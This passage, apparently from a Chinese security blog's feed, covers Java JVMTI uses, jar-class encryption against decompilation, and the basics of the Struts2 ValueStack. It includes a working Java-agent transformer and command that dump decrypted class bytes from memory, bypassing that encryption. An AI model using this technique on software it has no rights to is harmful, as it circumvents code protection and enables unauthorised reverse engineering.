title="产品运行时错误监测及调试"></a>产品运行时错误监测及调试</h3><p>想要看生产环境的异常，最原始的方式是登录到生产环境的机器查看日志。稍微高级一点的方式是通过日志监控或者APM等工具将异常采集上来。但是这些手段都有许多明显的缺点。首先，不是所有的异常都会被打印到日志中，有些异常可能被代码吃掉了；其次，打印异常的时候通常只有异常堆栈信息，异常发生时上下文的变量值很难获取到（除非有经验的程序员将其打印出来了），而这些信息对定位异常的原因至关重要。基于JVMTI可以开发出一款工具来时事监控生产环境的异常。这方面有一款成熟的商业软件OverOps，其有三个主要的功能：1. 采集到所有的异常，包括try catch之后没有打印出来的异常；2. 可以采集到异常发生时上下文所有变量的值；3. 可以将异常发生的堆栈对应的源代码采集展示出来，从而在一个系统上就可以看代码定位问题，不需要打开ide调试源代码。</p><h3 id="Java程序的调试（debug）"><a href="#Java程序的调试（debug）" class="headerlink" title="Java程序的调试（debug）"></a>Java程序的调试（debug）</h3><p>一般JAVA的IDE都自带了调试工具。例如Eclipse的调试器相信大部分人都使用过。它的调试器org.eclipse.jdt.debug插件底层就是调用的JVMTI来实现的。不仅如此，随着服务云化的发展，google甚至推出了云端调试工具cloud debugger。它时一个web应用，可以直接对生产环境进行远程调试，不需要重启或者中断服务。阿里也有类似的工具Zdebugger。</p><h3 id="Java程序的诊断（profile）"><a href="#Java程序的诊断（profile）" class="headerlink" title="Java程序的诊断（profile）"></a>Java程序的诊断（profile）</h3><p>当出现cpu使用率过高、线程死锁等问题时，需要使用一些JAVA性能剖析或者诊断工具来分析具体的原因。例如Alibaba开源的Java诊断工具Arthas，深受开发者喜爱。Arthas的功能十分强大，它可以查看或者动态修改某个变量的值、统计某个方法调用链上的耗时、拦截方法前后，打印参数值和返回值，以及异常信息等。</p><h3 id="热加载"><a href="#热加载" class="headerlink" title="热加载"></a>热加载</h3><p>热加载指的是在不重启虚拟机的情况下重新加载一些class。热加载可以使本地调试代码非常节省时间，不用每次更新代码都重启一边程序。同时，在一线不方便重启的线上环境也能派上用场。这方面的代表产品有商业产品JRebel等。JRebel能够对应用中的任何class起作用。</p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jpda2/index.html" target="_blank" rel="noopener">JVMTI 和 Agent 实现</a></p><p><a href="https://blog.csdn.net/duqi_2009/article/details/94518203" target="_blank" rel="noopener">Java黑科技之源：JVMTI完全解读</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-JVMTI简介&quot;&gt;&lt;a href=&quot;#0x01-JVMTI简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 JVMTI简介&quot;&gt;&lt;/a&gt;0x01 JVMTI简介&lt;/h2&gt;&lt;p&gt;JVMTI（JVM Tool Interface）是 Jav
      
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java代码反反编译对抗思路</title>
    <link href="https://www.mi1k7ea.com/2020/05/01/Java%E4%BB%A3%E7%A0%81%E5%8F%8D%E5%8F%8D%E7%BC%96%E8%AF%91%E6%80%9D%E8%B7%AF/"/>
    <id>https://www.mi1k7ea.com/2020/05/01/Java代码反反编译思路/</id>
    <published>2020-05-01T04:04:30.000Z</published>
    <updated>2020-05-03T03:56:49.415Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-几种反反编译的方法"><a href="#0x01-几种反反编译的方法" class="headerlink" title="0x01 几种反反编译的方法"></a>0x01 几种反反编译的方法</h2><p>Java代码是可以反编译的，但是很多时候一些Java开发者并不想让其他人知道自己的代码是怎么写的，就会对Java代码进行加密或混淆等操作，一般来说有三个思路：</p><ol><li>将class文件加密，这个是最安全的，但也费事儿，因为要重写classloader来解密class文件；</li><li>使用花指令，使得class文件不能反编译（利用反编译工具漏洞)；安全性一般，还是有花指令破解器；</li><li>代码混淆，提高代码阅读成本；简单易操作，一般采用这种或者与其它方式结合；</li></ol><p>当然，这几种方法都是可以被破解的，只是不同方法的破解成本不一样而已。</p><h2 id="0x02-准备jar包"><a href="#0x02-准备jar包" class="headerlink" title="0x02 准备jar包"></a>0x02 准备jar包</h2><p>新建一个ClassEncode项目，再新建两个类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String a = <span class="string">"This is Test Class .."</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="keyword">new</span> Test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is Test2 Class .."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着将该项目打包成jar包。</p><h3 id="IDEA打包jar"><a href="#IDEA打包jar" class="headerlink" title="IDEA打包jar"></a>IDEA打包jar</h3><p>在项目上鼠标右键 –&gt; Open Module Settings：</p><p><img src="/2020/05/01/Java代码反反编译思路/1.png" alt=""></p><p>Artifacts –&gt; + –&gt; JAR –&gt; From modules with dependencies：</p><p><img src="/2020/05/01/Java代码反反编译思路/2.png" alt=""></p><p>接着是设置Create JAR from Modules：</p><p><img src="/2020/05/01/Java代码反反编译思路/3.png" alt=""></p><p>Main Class是这个项目(脚本)的主方法，就是要运行的类，选Test类。</p><p>关于JAR files from libraries的两个选项:</p><ul><li><p>选中第一个的话，打完包后是一个Jar包；</p></li><li><p>选中第二个的话，打完包后是一个Jar包，外带你项目所用的Jar包；</p></li></ul><p>接下来是MF文件的存放目录。注意，<strong>不能使用默认目录，必须自定义目录，不然会运行错误，也不能使用src/main/resources这个目录</strong>。这里设置的是项目根目录下的src目录下来新建resource目录。</p><p>设置完之后，此时应该也必须有META-INF此文件，不然会运行错误。若JAR files from libraries选择src/main/resources目录，是没有META-INF文件的。Output directory是jar包的保存目录：</p><p><img src="/2020/05/01/Java代码反反编译思路/4.png" alt=""></p><p>点击Build：</p><p><img src="/2020/05/01/Java代码反反编译思路/5.png" alt=""></p><p>然后在out目录中看到生成了Jar包：</p><p><img src="/2020/05/01/Java代码反反编译思路/6.png" alt=""></p><p>这时的运行jar包就能执行了：</p><p><img src="/2020/05/01/Java代码反反编译思路/7.png" alt=""></p><p>ok，我们就拿这个包作为Demo进行反编译操作。</p><h3 id="手动打包jar"><a href="#手动打包jar" class="headerlink" title="手动打包jar"></a>手动打包jar</h3><p>当然，也可以手动打包jar文件。</p><p>目录结构如下：</p><ul><li><p>com</p><ul><li><p>mi1k7ea</p><p>​    Test.class</p><p>​    Test2.class</p></li></ul></li><li><p>META-INF</p><p>​    MANIFEST.MF</p></li></ul><p>其中MANIFEST.MF中的Main-Class要指定主要的执行类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: com.mi1k7ea.Test</span><br></pre></td></tr></table></figure><p>注意：最后必须要回车空行出来。</p><p>最后在当前目录运行一下命令打包成jar并执行即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm test.jar META-INF\MANIFEST.MF .</span><br><span class="line">java -jar test.jar</span><br></pre></td></tr></table></figure><h2 id="0x03-加密Jar包和class文件"><a href="#0x03-加密Jar包和class文件" class="headerlink" title="0x03 加密Jar包和class文件"></a>0x03 加密Jar包和class文件</h2><h3 id="利用JVMTI实现反反编译"><a href="#利用JVMTI实现反反编译" class="headerlink" title="利用JVMTI实现反反编译"></a>利用JVMTI实现反反编译</h3><p>JVMTI（JVM Tool Interface）是Java虚拟机所提供的native编程接口，可以探查JVM内部状态，并控制JVM应用程序的执行。可实现的功能包括但不限于：调试、监控、线程分析、覆盖率分析工具等。</p><p>JVMTI能够监听class加载事件，因此我们可以使用一套加密算法，对即将发布的Jar包进行字节码加密，然后在JVM加载这些类之前再解密。由于这部分代码最终会以动态库（.dll、.so文件）的形式发布出去，不容易被破解，因此对源代码可以达到较好的保护效果。</p><p>这里用到一个工具：<a href="https://github.com/AloneMonkey/JarEncrypt" target="_blank" rel="noopener">https://github.com/AloneMonkey/JarEncrypt</a></p><p>解压之后得到如下的目录结构及文件：</p><ul><li>JarEncrypt/encrypt：加密库<ul><li>encrypt.cpp</li><li>Makefile</li><li>Encrypt.java（Java加密执行文件）</li></ul></li><li>JarEncrypt/decrypt：解密库<ul><li>decrypt.cpp</li><li>Makefile</li></ul></li></ul><p>打开Encrypt.java文件，修改需要进行加密的类为以”com.mi1k7ea”开头的包下的所有类：</p><p><img src="/2020/05/01/Java代码反反编译思路/8.png" alt=""></p><p>然后打开decrypt子目录下的decrypt.cpp文件，修改需要进行解密的类为以”com.mi1k7ea”开头的包下的所有类：</p><p><img src="/2020/05/01/Java代码反反编译思路/9.png" alt=""></p><p>接着，进入encrypt目录，执行make，编译生成libencrypt.so：</p><p><img src="/2020/05/01/Java代码反反编译思路/10.png" alt=""></p><p>注意，在Linux可能会报找不到jni.h和jni_md.h文件的错误，这里需要通过<code>locate jni.h</code>和<code>locate jni_md.h</code>命令来找到这两个文件所在的路径，然后在Makefile中第一个INCLUDEDIR项中添加进去即可：</p><p><img src="/2020/05/01/Java代码反反编译思路/11.png" alt=""></p><p>libdecrypt.so的编译同上：</p><p><img src="/2020/05/01/Java代码反反编译思路/12.png" alt=""></p><p>接着，通过<code>javac Encrypt.java</code>命令将该java文件转换为class文件：</p><p><img src="/2020/05/01/Java代码反反编译思路/13.png" alt=""></p><p>通过如下命令加密jar包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.library.path=. -cp . Encrypt -src ClassEncode.jar</span><br></pre></td></tr></table></figure><p><img src="/2020/05/01/Java代码反反编译思路/14.png" alt=""></p><p>此时用反编译工具是没办法成功反编译的：</p><p><img src="/2020/05/01/Java代码反反编译思路/15.png" alt=""></p><p>此时运行肯定是会失败的：</p><p><img src="/2020/05/01/Java代码反反编译思路/16.png" alt=""></p><p>使用刚刚的编译生成的解密库来执行就ok了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=<span class="variable">$&#123;LD_LIBRARY_PATH&#125;</span>:/root/jvmti/decrypt</span><br><span class="line">java -agentlib:decrypt -jar ClassEncode_encrypt.jar</span><br></pre></td></tr></table></figure><p><img src="/2020/05/01/Java代码反反编译思路/17.png" alt=""></p><p>至此，已经通过加密Jar包和class文件实现了反反编译。在发布时候，需要把ClassEncode_encrypt.jar和libdecrypt.so发布出去，执行时候引入libdecrypt即可。</p><h3 id="通过Java-Agent绕过反反编译"><a href="#通过Java-Agent绕过反反编译" class="headerlink" title="通过Java-Agent绕过反反编译"></a>通过Java-Agent绕过反反编译</h3><p>这部分在JavaAgent中会具体说明。</p><p>MainAgent.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dumpclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> DumpClassTransformer());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DumpClassTransformer.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dumpclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DumpClassTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String DUMP_PACKAGE = System.getProperty(<span class="string">"dump_package"</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String OUT_FOLDER = System.getProperty(<span class="string">"dump_out_folder"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classfileBuffer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String tmpClassName = className.replace(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line">        <span class="keyword">if</span> (tmpClassName.startsWith(DUMP_PACKAGE)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                writeClass(className, classfileBuffer);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">writeClass</span><span class="params">(String className, <span class="keyword">byte</span>[] classfileBuffer)</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">null</span>;</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String folder = OUT_FOLDER;</span><br><span class="line">            <span class="keyword">if</span> (!folder.endsWith(File.separator)) &#123;</span><br><span class="line">                folder = folder + File.separator;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String classPath = className.substring(<span class="number">0</span>, className.lastIndexOf(<span class="string">"/"</span>));</span><br><span class="line">            className = className.substring(className.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>, className.length());</span><br><span class="line"></span><br><span class="line">            String path = OUT_FOLDER + File.separator + classPath;</span><br><span class="line">            file = <span class="keyword">new</span> File(path);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                file.mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line">            file = <span class="keyword">new</span> File(path + File.separator + className + <span class="string">".class"</span>);</span><br><span class="line"></span><br><span class="line">            fileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">            fileOutputStream.write(classfileBuffer);</span><br><span class="line"></span><br><span class="line">            fileOutputStream.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (fileOutputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    fileOutputStream.close();</span><br><span class="line">                    fileOutputStream = <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MANIFEST.MF：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: com.dumpclass.MainAgent</span><br></pre></td></tr></table></figure><p>打包成ClassEncode_encrypt.jar。</p><p>通过以下命令，指定JavaAgent的jar包，然后在目标jar包主执行类方法执行之前先执行DumpClass.jar中的premain()方法，从而从内存将加密的目标jar类的字节码Dump下来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Ddump_package=com.mi1k7ea -Ddump_out_folder=/tmp -agentlib:decrypt -javaagent:DumpClass.jar -jar ClassEncode_encrypt.jar</span><br></pre></td></tr></table></figure><p><img src="/2020/05/01/Java代码反反编译思路/18.png" alt=""></p><p>下载下来，此时就能从成功反编译</p><p>获取到加密class文件的内容了：</p><p><img src="/2020/05/01/Java代码反反编译思路/19.png" alt=""></p><h2 id="0x04-Java代码混淆"><a href="#0x04-Java代码混淆" class="headerlink" title="0x04 Java代码混淆"></a>0x04 Java代码混淆</h2><p>参考：<a href="https://www.cnblogs.com/nevermorewang/p/8041548.html" target="_blank" rel="noopener">https://www.cnblogs.com/nevermorewang/p/8041548.html</a></p><p>这种反反编译方法的没啥破解方法，就是代码比较难读而已，花点时间精力就可以搞定。</p><h2 id="0x05-使用花指令"><a href="#0x05-使用花指令" class="headerlink" title="0x05 使用花指令"></a>0x05 使用花指令</h2><p>这部分还未研究，有待补充。。。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="http://www.alonemonkey.com/2016/05/25/encrypt-jar-class/" target="_blank" rel="noopener">jar包加密保护解决方案</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-几种反反编译的方法&quot;&gt;&lt;a href=&quot;#0x01-几种反反编译的方法&quot; class=&quot;headerlink&quot; title=&quot;0x01 几种反反编译的方法&quot;&gt;&lt;/a&gt;0x01 几种反反编译的方法&lt;/h2&gt;&lt;p&gt;Java代码是可以反编译的，但是很多时候一些
      
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Struts2基础篇之ValueStack（值栈）</title>
    <link href="https://www.mi1k7ea.com/2020/05/01/Struts2%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B9%8BValueStack%EF%BC%88%E5%80%BC%E6%A0%88%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2020/05/01/Struts2基础篇之ValueStack（值栈）/</id>
    <published>2020-04-30T16:00:05.000Z</published>
    <updated>2020-08-15T06:40:56.383Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>本笔记直接参考或引自如下链接文章：</p><p><a href="http://c.biancheng.net/struts2/" target="_blank" rel="noopener">http://c.biancheng.net/struts2/</a></p><p><a href="https://www.w3cschool.cn/struts_2/" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/</a></p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>值栈（ValueStack）就是 OGNL 表达式存取数据的地方。在一个值栈中，封装了一次请求所需要的所有数据。值栈是一组对象，按照提供的顺序存储以下这些对象：</p><table><thead><tr><th style="text-align:left">序号</th><th style="text-align:left">对象和说明</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left"><strong>Temporary对象</strong>实际中存在各种在页面执行期间创建的temporary对象。例如，JSP标签循环集合的当前迭代值。</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left"><strong>Model对象</strong>如果在struts应用程序中使用Model对象，则当前Model对象放在值堆栈上的action之前。</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left"><strong>Action对象</strong>这是指正在执行的当前action对象。</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left"><strong>命名对象</strong>这些对象包括#application，#session，#request，#attr和#parameters以及所引用的相应的servlet作用域。</td></tr></tbody></table><p>在使用 Struts2 的项目中，Struts2 会为每个请求创建一个新的值栈，也就是说，值栈和请求是一一对应的关系，这种一一对应的关系使值栈能够线程安全地为每个请求提供公共的数据存取服务。</p><h2 id="0x02-作用"><a href="#0x02-作用" class="headerlink" title="0x02 作用"></a>0x02 作用</h2><p>值栈可以作为一个数据中转站在前台与后台之间传递数据，最常见的就是将 Struts2 的标签与 OGNL 表达式结合使用。值栈实际上是一个接口，在 Struts2 中利用 OGNL 时，实际上使用的就是实现了该接口的 OgnlValueStack 类，这个类是 OGNL 的基础。</p><h2 id="0x03-生命周期"><a href="#0x03-生命周期" class="headerlink" title="0x03 生命周期"></a>0x03 生命周期</h2><p>值栈贯穿整个 Action 的生命周期，每个 Action 类的对象实例都拥有一个 ValueStack 对象，在 ValueStack 对象中保存了当前 Action 对象和其他相关对象。</p><p>Struts2 框架把 ValueStack 对象保存在一个名为 struts.valueStack 的 request 属性中，也就是说，值栈与 Action 的生命周期一致。值栈的生命周期随着 request 的创建而创建，随着 request 的销毁而销毁。</p><h2 id="0x04-值栈的获取方式"><a href="#0x04-值栈的获取方式" class="headerlink" title="0x04 值栈的获取方式"></a>0x04 值栈的获取方式</h2><p>要获取值栈中存储的数据，首先应该获取值栈。</p><p>值栈的获取有两种方式。</p><h3 id="在request中获取值栈"><a href="#在request中获取值栈" class="headerlink" title="在request中获取值栈"></a>在request中获取值栈</h3><p>ValueStack 对象在 request 范围内的存储方式为 <code>request.setAttribute(&quot;struts.valueStack&quot;,valuestack)</code>，可以通过如下方式从 request 中取出值栈的信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取 ValueStack 对象，通过 request 对象获取</span></span><br><span class="line">ValueStack valueStack = (ValueStack)ServletActionContext.getRequest()</span><br><span class="line">            .getAttribute(ServletActionContext.STRUTS_VALUESTACK_KEY);</span><br></pre></td></tr></table></figure><p>ServletActionContext.STRUTS_VALUESTACK_KEY 是 ServletActionContext 类中的常量，它的值为 struts.valueStack。</p><h3 id="在ActionContext中获取值栈"><a href="#在ActionContext中获取值栈" class="headerlink" title="在ActionContext中获取值栈"></a>在ActionContext中获取值栈</h3><p>在使用 Struts2 框架时，可以使用 OGNL 操作 Context 对象从 ValueStack 中存取数据，也就是说，可以从 Context 对象中获取 ValueStack 对象。实际上，Struts2 框架中的 Context 对象就是 ActionContext。</p><p>ActionContext 获取 ValueStack 对象的方式如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过 ActionContext 获取 valueStack 对象</span></span><br><span class="line">ValueStack valueStack = ActionContext.getContext().getValueStack();</span><br></pre></td></tr></table></figure><p>ActionContext 对象是在 StrutsPrepareAndExcuteFilter 的 doFilter() 方法中被创建的，在源码中用于创建 ActionContext 对象的 createActionContext() 方法内可以找到获取的 ValueStack 对象的信息。</p><p>方法中还有这样一段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx=<span class="keyword">new</span> ActionContext(stack.getContext());</span><br></pre></td></tr></table></figure><p>从上述代码中可以看出，ValueStack 对象中的 Context 对象被作为参数传递给了 ActionContext 对象，这也就说明 ActionContext 对象中持有了 ValueStack 对象的引用，因此可以通过 ActionContext 对象获取 ValueStack 对象。</p><p>其实ValueStack就在ActionContext的request-&gt;struts.ValueStack中：</p><p><img src="/2020/05/01/Struts2基础篇之ValueStack（值栈）/1.png" alt=""></p><h2 id="0x05-值栈的方法"><a href="#0x05-值栈的方法" class="headerlink" title="0x05 值栈的方法"></a>0x05 值栈的方法</h2><p>一旦你有一个值栈对象，你可以使用以下方法来操纵该对象：</p><table><thead><tr><th style="text-align:left">序号</th><th style="text-align:left">值栈方法和说明</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left"><strong>Object findValue(String expr)</strong>通过在默认搜索顺序中对值栈评估所给定的表达式来查找值。</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left"><strong>CompoundRoot getRoot()</strong>获取将对象推入值栈的CompoundRoot。</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left"><strong>Object peek()</strong>获取值栈顶部的对象而不改变值栈。</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left"><strong>Object pop()</strong>获取值栈顶部的对象，并将其从值栈中删除。</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left"><strong>void push(Object o)</strong>将对象放在值栈的顶部。</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left"><strong>void set(String key,Object o)</strong>使用给定的key在值栈上设置一个对象，使其可通过findValue（key,…）检索。</td></tr><tr><td style="text-align:left">7</td><td style="text-align:left"><strong>void setDefaultType(Class defaultType)</strong>设置在获取值时要转换的默认类型。</td></tr><tr><td style="text-align:left">8</td><td style="text-align:left"><strong>void setValue(String expr,Object value)</strong>尝试使用由默认搜索顺序给定的表达式在值栈的bean上设置属性。</td></tr><tr><td style="text-align:left">9</td><td style="text-align:left"><strong>int size()</strong> 获取值栈中的对象数。</td></tr></tbody></table><h2 id="0x06-ValueStack、StackContext、ActionContext"><a 